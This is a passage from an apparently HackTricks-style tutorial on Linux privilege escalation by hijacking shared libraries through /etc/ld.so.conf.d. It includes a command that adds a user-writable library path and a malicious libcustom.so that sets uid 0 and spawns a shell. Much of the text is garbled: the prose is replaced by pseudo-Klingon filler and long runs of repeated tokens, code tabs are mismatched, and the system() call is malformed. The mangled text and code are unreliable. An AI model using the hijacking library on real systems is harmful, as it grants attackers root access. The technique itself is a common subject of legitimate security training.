# ld.so privesc exploit example

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Prepare the environment

In the following section you can find the code of the files we are going to use to prepare the environment

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% tab title="libcustom.h" %}

```c
#ifndef LIBCUSTOM_H
#define LIBCUSTOM_H

void custom_function();

#endif
```

{% endtab %}
```c
#include <stdio.h>

void vuln_func();
```
{% tab title="libcustom.c" %}

```c
#include <stdio.h>

void custom_function() {
    printf("This is a custom function\n");
}
```

{% endtab %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% tabs %}
{% tab title="Klingon" %}
1. **Qap** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach** vItlhutlh **ghItlh** vItlhutlh **mach**
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

In this scenario we are going to suppose that **someone has created a vulnerable entry** inside a file in _/etc/ld.so.conf/_:

## qo'noS

vaj vItlhutlh **vay' vItlhutlh** vay' _/etc/ld.so.conf/_ Daq lo'laHbe':
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
**Download and compile** the following code inside that path:

**Download and compile** the following code inside that path:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
**ghobe'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
**jIqImej** **`/home/ubuntu/lib`** **vItlhutlh** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'**
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
Qapla'! jImejDaq vItlhutlhlaHbe'chugh, 'ach **root 'ej 'oH 'e' vItlhutlhlaHbe'chugh** vulnerable binary 'e' vItlhutlhlaHbe'chugh, 'ej 'e' vItlhutlhlaHbe'chugh.
{% endhint %}

### 'oH misconfigurations - vuln cha'

vuln cha previous example we faked a misconfiguration where an administrator **set a non-privileged folder inside a configuration file inside `/etc/ld.so.conf.d/`**.\
'ach 'oH misconfigurations vItlhutlhlaHbe'chugh, 'ej 'ej **write permissions** vItlhutlhlaHbe'chugh **config file** vItlhutlhlaHbe'chugh `/etc/ld.so.conf.d`s, `/etc/ld.so.conf.d` folder 'ej `/etc/ld.so.conf` file vItlhutlhlaHbe'chugh 'oH vuln cha 'ej 'oH vuln cha.

## vuln cha 2

**Suppose you have sudo privileges over `ldconfig`**.\
